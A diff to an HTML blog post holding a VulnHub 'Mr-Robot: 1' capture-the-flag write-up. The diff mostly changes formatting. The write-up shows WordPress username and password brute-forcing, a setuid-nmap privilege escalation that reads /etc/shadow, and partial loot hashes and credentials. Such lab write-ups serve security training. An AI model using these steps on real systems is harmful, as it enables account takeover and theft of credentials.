@@ -21,39 +21,6 @@
     <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
    </head>
   <body>
-    <style>
-      .collapsible {
-        cursor: pointer;
-        -webkit-user-select: none;
-        -moz-user-select: none;
-        -ms-user-select: none;
-        user-select: none;
-        width: 100%;
-        border: none;
-        text-align: left;
-        outline: none;
-        cursor: pointer;
-      }
-      .collapsible:after {
-        content: "+";
-        transition: transform .3s ease;
-        display: inline-block;
-        font-weight: bold;
-        float: right;
-      }
-      .expanded::after {
-        content: "-";
-        -ms-transform: rotate(360deg);
-        -webkit-transform: rotate(360deg);
-        transform: rotate(360deg);
-      }
-      .nested {
-        display: none;
-      }
-      .active {
-        display: block;
-      }
-    </style>
     <div class="header">
       <table>
         <tr>
@@ -66,13 +33,13 @@
     </div>
     <div class="body">
           <h1 class="h1 collapsible" onclick="toggle(this);">[VulnHub] Mr-Robot: 1</h1>
-                  <p class="nested"><a href="/posts/20191017_vulnhub-moria11.html"> « </a>📅 published on <code>21/Oct/2019</code><a href="/posts/20191028_vulnhub-node1.html"> » </a></p>
+                  <p><a href="/posts/20191017_vulnhub-moria11.html"> « </a>📅 published on <code>21/Oct/2019</code><a href="/posts/20191028_vulnhub-node1.html"> » </a></p>
                 <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/mr-robot-1,151/">Mr-Robot: 1</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p>
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_mrrobot1/killchain.png" /></p>
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
-<p class="nested"re><code># Nmap 7.70 scan initiated Thu Oct 17 15:46:57 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.mrrobot1/results/192.168.92.134/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.mrrobot1/results/192.168.92.134/scans/xml/_quick_tcp_nmap.xml 192.168.92.134
+<pre class="nested"><code># Nmap 7.70 scan initiated Thu Oct 17 15:46:57 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.mrrobot1/results/192.168.92.134/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.mrrobot1/results/192.168.92.134/scans/xml/_quick_tcp_nmap.xml 192.168.92.134
 Nmap scan report for 192.168.92.134
 Host is up, received arp-response (0.00077s latency).
 Scanned at 2019-10-17 15:46:58 PDT for 22s
@@ -120,7 +87,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </code></pre>
 
 <p class="nested">2. We find 2 interesting entries within the <code>http://192.168.92.134/robots.txt</code> file. One of these is for the first of the 3 key files and the other entry points to what looks like a dictionary file:  </p>
-<p class="nested"re><code>http://192.168.92.134/robots.txt
+<pre class="nested"><code>http://192.168.92.134/robots.txt
   http://192.168.92.134/fsocity.dic
   http://192.168.92.134/key-1-of-3.txt
 </code></pre>
@@ -130,12 +97,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p class="nested">3. We download the dictionary file and trim its contents to have only unique entries. This reduced the count of possible passwords from <code>858160</code> to <code>11451</code>:  </p>
 <p class="nested"><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot02.png" />  </p>
 <p class="nested">4. From the <code>gobuster</code> scan, we also find entries pointing to a Wordpress installation. We confirm this by visiting the login page:  </p>
-<p class="nested"re><code>http://192.168.92.134/wp-login
+<pre class="nested"><code>http://192.168.92.134/wp-login
 </code></pre>
 
 <p class="nested"><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot03.png" />  </p>
 <p class="nested">5. After trying a few credentials manually, we decide to bruteforce usernames first. We first need to create a usernames list from the <code>fsocity.dic</code> dictionary found earlier. For our case, we will filter on strings that are 4-8 chars long. Doing this, we eventually find 5247 possible candidates. We then bruteforce these strings and find a valid username:  </p>
-<p class="nested"re><code>grep -E '^[a-zA-Z]' fsocity.dic | sort -u |  awk 'length($1) &lt;=8 &amp;&amp; length($1) &gt;= 4 { print $1}' &gt; users
+<pre class="nested"><code>grep -E '^[a-zA-Z]' fsocity.dic | sort -u |  awk 'length($1) &lt;=8 &amp;&amp; length($1) &gt;= 4 { print $1}' &gt; users
 wpuser http://192.168.92.134/ users
   Found valid username: elliot
   Found valid username: Elliot
@@ -145,23 +112,23 @@ wpuser http://192.168.92.134/ users
 <p class="nested"><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot04.png" />  </p>
 <p class="nested"><img alt="writeup.enumeration.steps.5.2" src="/static/files/posts_vulnhub_mrrobot1/screenshot04a.png" />  </p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
-<h4>Open Ports:</h4>
-<p class="nested"re><code>80/tcp   |  http      |  Apache httpd
+<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
+<pre class="nested"><code>80/tcp   |  http      |  Apache httpd
 443/tcp  |  ssl/http  |  Apache httpd
 </code></pre>
 
-<h4>Files</h4>
-<p class="nested"re><code>http://192.168.92.134/robots.txt
+<h4 class="h4 collapsible" onclick="toggle(this);">Files</h4>
+<pre class="nested"><code>http://192.168.92.134/robots.txt
 http://192.168.92.134/key-1-of-3.txt
 </code></pre>
 
-<h4>Users</h4>
-<p class="nested"re><code>wordpress: elliot
+<h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
+<pre class="nested"><code>wordpress: elliot
 </code></pre>
 
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. We confirm that the username is indeed valid from Wordpress error message for incorrect password. We then use <code>wpscan</code> to bruteforce password for user <code>elliot</code> using the trimmed dictionary file and find a match:  </p>
-<p class="nested"re><code>wpscan --url http://192.168.92.134 -P fsocity.dic.trimmed -U elliot
+<pre class="nested"><code>wpscan --url http://192.168.92.134 -P fsocity.dic.trimmed -U elliot
   [i] Valid Combinations Found:
    | Username: elliot, Password: ER28-0652
 </code></pre>
@@ -175,7 +142,7 @@ http://192.168.92.134/key-1-of-3.txt
 <p class="nested"><img alt="writeup.exploitation.steps.2.4" src="/static/files/posts_vulnhub_mrrobot1/screenshot07c.png" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.2.5" src="/static/files/posts_vulnhub_mrrobot1/screenshot07d.png" />  </p>
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
-<p class="nested"re><code>robot@linux&gt; id
+<pre class="nested"><code>robot@linux&gt; id
 uid=1002(robot) gid=1002(robot) groups=1002(robot)
 robot@linux&gt;  
 robot@linux&gt; uname
@@ -201,7 +168,7 @@ robot
 
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested">1. While looking at the <code>/home/</code> directory we find that there is a directory for user <code>robot</code> and this user has access to the second key file <code>key-2-of-3.txt</code>. We have to switch user to access this key file and to do that we need user <code>robot</code>'s password. We also find a word-readable <code>password.raw-md5</code> file within this directory and use Google to find that it is the MD5 hash of the string <code>abcdefghijklmnopqrstuvwxyz</code>. We can now proceed and switch user:  </p>
-<p class="nested"re><code>cat /home/robot/password.raw-md5
+<pre class="nested"><code>cat /home/robot/password.raw-md5
   robot:c3fcd3d76192e4007dfb496cca67e13b
 su - robot
 cat /home/robot/key-2-of-3.txt
@@ -211,7 +178,7 @@ cat /home/robot/key-2-of-3.txt
 <p class="nested"><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_vulnhub_mrrobot1/screenshot08a.png" />  </p>
 <p class="nested"><img alt="writeup.privesc.steps.1.3" src="/static/files/posts_vulnhub_mrrobot1/screenshot08b.png" />  </p>
 <p class="nested">2. We find that the <code>nmap</code> binary on this system has <code>setuid</code> privileges. We can use this to gain elevated access:  </p>
-<p class="nested"re><code>find / -type f -perm -04000 2&gt;/dev/null
+<pre class="nested"><code>find / -type f -perm -04000 2&gt;/dev/null
 ls -la /usr/local/bin/nmap
 nmap --interactive
   !cat /etc/shadow
@@ -223,24 +190,24 @@ nmap --interactive
 <p class="nested"><img alt="writeup.privesc.steps.2.3" src="/static/files/posts_vulnhub_mrrobot1/screenshot09b.png" />  </p>
 <p class="nested"><img alt="writeup.privesc.steps.2.4" src="/static/files/posts_vulnhub_mrrobot1/screenshot09c.png" />  </p>
 <p class="nested">3. We can now read the <code>/root/key-3-of-3.txt</code> file to complete the challenge:  </p>
-<p class="nested"re><code>cat /root/key-3-of-3.txt
+<pre class="nested"><code>cat /root/key-3-of-3.txt
 </code></pre>
 
 <p class="nested"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot10.png" />  </p>
 <h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
-<p class="nested"re><code>root:$6$9xQC1KOf$5cmONytt0VF/wi3Np3jZGRSVzpGj6sXxVHkyJLjV4edlBxTVmW91pcGwAViViSWcAS/.OF0iuvylU5Izn........................
+<pre class="nested"><code>root:$6$9xQC1KOf$5cmONytt0VF/wi3Np3jZGRSVzpGj6sXxVHkyJLjV4edlBxTVmW91pcGwAViViSWcAS/.OF0iuvylU5Izn........................
 bitnamiftp:$6$saPiFTAH$7K09sg5oIfkIs5kuMx1R/Um4HNd8O6vF2n8oICEom8VVer0BYATY5wtzdPdP3JeuKbZ4RYBml0THNQv8.........................
 robot:$6$HmQCDKcM$mcINMrQFa0Qm7XaUaS5xLEBSeP3bUkr18iwgwTAL8AIfUDYBWG5L8J9.Ukb3gVWUQoYam4G0m.I5qaHBn........................
 </code></pre>
 
 <h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
-<p class="nested"re><code>ssh: robot/abcdefghijklmnopqrs.......
+<pre class="nested"><code>ssh: robot/abcdefghijklmnopqrs.......
 wordpress: elliot/ER28-....
 </code></pre>
 
 <h3 class="h3 collapsible" onclick="toggle(this);">Flags</h3>
-<p class="nested"re><code>http://192.168.92.134/key-1-of-3.txt: 073403c8a58a1f80d9..............
+<pre class="nested"><code>http://192.168.92.134/key-1-of-3.txt: 073403c8a58a1f80d9..............
 /home/robot/key-2-of-3.txt: 822c73956184f694993b............
 /root/key-3-of-3.txt: 04787ddef27c3dee1ee16...........
 </code></pre>
@@ -250,19 +217,17 @@ wordpress: elliot/ER28-....
 <li><a href="https://www.vulnhub.com/entry/mr-robot-1,151/">https://www.vulnhub.com/entry/mr-robot-1,151/</a>  </li>
 <li><a href="http://f4l13n5n0w.github.io/blog/2016/08/10/vulnhub-mr-robot-1/">http://f4l13n5n0w.github.io/blog/2016/08/10/vulnhub-mr-robot-1/</a>  </li>
 </ul>
-        <p class="nested" style="text-align:center;">(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p>
-                  <p class="nested" style="text-align:center;">« <a href="/posts/20191017_vulnhub-moria11.html">[VulnHub] Moria: 1.1...</a> « | » <a href="/posts/20191028_vulnhub-node1.html">[VulnHub] Node: 1...</a> »</p>
+        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p>
+                  <p style="text-align:center;">« <a href="/posts/20191017_vulnhub-moria11.html">[VulnHub] Moria: 1.1...</a> « | » <a href="/posts/20191028_vulnhub-node1.html">[VulnHub] Node: 1...</a> »</p>
             </div>
     <script>hljs.initHighlightingOnLoad();</script>
     <script>hljs.initLineNumbersOnLoad();</script>
     <script>
       function toggle(elem) {
         elem.classList.toggle("expanded");
-
-        var ish2 = false; var ish3 = false;
-        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }
-        console.log(elem); console.log(ish2); console.log(ish3);
-
+        var ish2=false; var ish3=false; var ish4=false;
+        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }; if (elem.classList.contains("h4")) { ish4=true; }
+        console.log(elem); console.log(ish2); console.log(ish3); console.log(ish4);
         var sibling = elem.nextElementSibling;
         while (sibling) {
           if (ish2 && sibling.classList.contains("h2")) {
@@ -270,6 +235,10 @@ wordpress: elliot/ER28-....
             break;
           }
           if (ish3 && (sibling.classList.contains("h2") || sibling.classList.contains("h3"))) {
+            sibling.classList.toggle("active");
+            break;
+          }
+          if (ish4 && (sibling.classList.contains("h2") || sibling.classList.contains("h3") || sibling.classList.contains("h4"))) {
             sibling.classList.toggle("active");
             break;
           }
